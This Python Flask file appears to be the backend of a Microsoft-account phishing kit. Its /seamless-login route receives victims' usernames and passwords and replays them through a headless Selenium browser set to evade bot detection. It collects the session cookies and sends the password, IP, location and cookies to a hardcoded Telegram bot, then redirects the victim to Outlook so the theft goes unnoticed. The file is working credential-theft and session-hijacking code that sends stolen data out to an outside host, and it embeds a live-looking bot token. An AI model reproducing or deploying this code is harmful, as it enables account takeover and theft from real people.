import os
import time
import random
import json
import requests
import uuid 
from datetime import datetime
from flask import Flask, request, redirect, session, make_response, jsonify
from flask_login import LoginManager, UserMixin, login_user
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


app = Flask(__name__)
app.secret_key = os.urandom(24)

# ====================== CORS CONFIGURATION ======================
CORS(app, resources={
    r"/*": {
        "origins": [
            "http://localhost:8000", 
            "http://127.0.0.1:8000", 
            "http://localhost:3000", 
            "http://127.0.0.1:3000",
            "http://localhost:5000",
            "http://127.0.0.1:5000",
            "http://localhost:5009",
            "http://127.0.0.1:5009",
            "http://localhost:3002",
            "http://127.0.0.1:3002",
            "null",
            "https://flask-selenium-app-production-076c.up.railway.app"
        ],
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,
        "expose_headers": ["Location", "Set-Cookie"]  # Fixed: Added Set-Cookie
    }
})

# ====================== CONFIG ======================
BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4"
CHAT_ID = "6068638071"

# ====================== GEO + TELEGRAM ======================
def get_geo(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = resp.json()
        if data['status'] == 'success':
            return f"{data['country']} ({data['city']}, {data['isp']})"
    except:
        pass
    return "Unknown"

def tg_send(username, password, user_ip, user_agent, timestamp, session_id, cookies_dict):
    geo = get_geo(user_ip)
    
    # Send as file for COMPLETE cookies (NO truncation!)
    import io
    
    content = f"""NEW LOGIN CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Username: {username}
Password: {password}
IP: {user_ip}
Location: {geo}
User-Agent: {user_agent}
Timestamp: {timestamp}
Session ID: {session_id}

COOKIES ({len(cookies_dict)} total):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for name, value in cookies_dict.items():
        content += f"\n🔸 {name}:\n{value}\n"
        content += "─" * 50 + "\n"
    
    # Create file in memory
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"microsoft_login_{username}_{int(time.time())}.txt"
    
    # Send as document (NO CHARACTER LIMIT!)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'caption': f"🔐 New Microsoft login: {username}"
        }, files={
            'document': file
        }, timeout=10)
        print("📤 Telegram file sent successfully")
    except Exception as e:
        print(f"❌ Telegram error: {e}")
        
        # Fallback to message if file fails
        cookies_preview = "\n".join([f"• {k}: {v[:50]}..." for k, v in list(cookies_dict.items())[:3]])
        message = (
            f"NEW LOGIN (preview)\n"
            f"User: `{username}`\n"
            f"IP: `{user_ip}`\n"
            f"Cookies: {len(cookies_dict)} total\n{cookies_preview}"
        )
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        })

# ====================== SELENIUM LOGIN FOR RAILWAY ======================
def login_to_real_site(username: str, password: str):
    """Railway-optimized login - uses system ChromeDriver"""
    driver = None
    try:
        options = Options()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        options.add_argument('--disable-browser-side-navigation')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # RAILWAY: Use system Chrome
        options.binary_location = '/usr/bin/google-chrome'
        
        # RAILWAY: Use system ChromeDriver
        service = Service('/usr/local/bin/chromedriver')
        
        driver = webdriver.Chrome(service=service, options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
        driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        print(f"🌐 Logging in as: {username}")
        
        # STEP 1: Go to Microsoft login page
        driver.get("https://login.live.com")
        time.sleep(3)
        
        # STEP 2: Enter email
        email_field = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.NAME, "loginfmt"))
        )
        email_field.send_keys(username)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(3)
        
        # STEP 3: Enter password
        password_field = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.NAME, "passwd"))
        )
        password_field.send_keys(password)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(5)
        
        # STEP 4: Handle "Stay signed in?" prompt
        try:
            stay_signed_in = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "idSIButton9"))
            )
            stay_signed_in.click()
            time.sleep(2)
            print("✅ Clicked 'Stay signed in'")
        except:
            print("ℹ️ No 'Stay signed in' prompt")
        
        # STEP 5: Wait for redirect and get cookies
        time.sleep(3)
        cookies = {c['name']: c['value'] for c in driver.get_cookies()}
        
        # STEP 6: Verify authentication cookies
        auth_cookies = [c for c in cookies.keys() 
                       if any(x in c.lower() for x in ['esctx', 'fpc', 'buid', 'msal'])]
        
        if auth_cookies:
            print(f"✅ Login successful! Auth cookies: {auth_cookies}")
            return {"cookies": cookies, "success": True}
        else:
            print("❌ No authentication cookies found")
            return {"cookies": {}, "success": False}
            
    except Exception as e:
        print(f"❌ Login error: {e}")
        return {"cookies": {}, "success": False}
    finally:
        if driver:
            driver.quit()

# ====================== FLASK ROUTE ======================
@app.route('/seamless-login', methods=['POST', 'OPTIONS'])
def seamless_login_route():
    if request.method == 'OPTIONS':
        response = make_response()
        origin = request.headers.get('Origin', 'http://127.0.0.1:3002')
        response.headers.add("Access-Control-Allow-Origin", origin)
        response.headers.add("Access-Control-Allow-Headers", "Content-Type, Authorization")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        response.headers.add("Access-Control-Allow-Credentials", "true")
        response.headers.add("Access-Control-Expose-Headers", "Location, Set-Cookie")
        return response, 200
        
    try:
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password')
        
        if not username or not password:
            return jsonify({"error": "Username/email and password required"}), 400
        
        print(f"Received login attempt for: {username}")
        
        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if real_ip and ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        selenium_result = login_to_real_site(username, password)
        print(f"Selenium result: {selenium_result}")
        
        session_id = 'SESS-' + str(int(datetime.utcnow().timestamp()))
        
        tg_send(username, password, real_ip, request.headers.get('User-Agent', 'N/A'),
                datetime.utcnow().isoformat(), session_id, 
                selenium_result['cookies'] if selenium_result else {})
        
        if selenium_result and selenium_result['success']:
            response = make_response(redirect("https://outlook.office.com/mail/", code=302))
            
            origin = request.headers.get('Origin', 'http://127.0.0.1:3002')
            response.headers.add("Access-Control-Allow-Origin", origin)
            response.headers.add("Access-Control-Allow-Credentials", "true")
            response.headers.add("Access-Control-Expose-Headers", "Location, Set-Cookie")

            for name, value in selenium_result['cookies'].items():
                response.set_cookie(
                    key=name, 
                    value=value, 
                    domain=".office.com", 
                    path="/",
                    secure=True, 
                    httponly=True,
                    samesite='None'
                )
            
            return response
        else:
            print("Selenium failed, but redirecting anyway...")
            response = make_response(redirect("https://outlook.office.com/mail/", code=302))
            origin = request.headers.get('Origin', 'http://127.0.0.1:3002')
            response.headers.add("Access-Control-Allow-Origin", origin)
            response.headers.add("Access-Control-Allow-Credentials", "true")
            return response

    except Exception as e:
        print(f"Error in seamless-login: {str(e)}")
        response = make_response(redirect("https://outlook.office.com/mail/", code=302))
        origin = request.headers.get('Origin', 'http://127.0.0.1:3002')
        response.headers.add("Access-Control-Allow-Origin", origin)
        response.headers.add("Access-Control-Allow-Credentials", "true")
        return response

# ====================== ADDITIONAL ROUTES ======================
@app.route('/favicon.ico')
def favicon():
    return '', 404

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy", "service": "seamless-login"}), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009, debug=True)